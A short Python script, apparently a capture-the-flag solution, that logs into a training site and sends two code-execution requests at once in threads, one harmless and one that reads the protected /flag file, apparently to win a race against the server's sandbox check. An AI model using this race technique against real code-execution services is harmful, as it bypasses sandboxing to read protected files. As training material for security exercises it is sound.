import requests
from threading import Thread

def login(s, u,p):
    url = "http://pybook.training.jinblack.it/login"
    payload = {"username":u,"password":p}
    
    r = s.post(url,data=payload)
    print(r.text)
    
def run(s, code):
    url = "http://pybook.training.jinblack.it/run"
    payload = code
    r = s.post(url,data=payload)
    print(r.text)
    
s = requests.Session()
login(s,"vybraan",".")

code = """
print('hello')
"""

code_P = """

f = open("/flag", "r")
data = f.read()
print(data)
"""
t1 = Thread(target=run,args=(s,code))
t2 = Thread(target=run,args=(s,code_P))

t1.start()
t2.start()
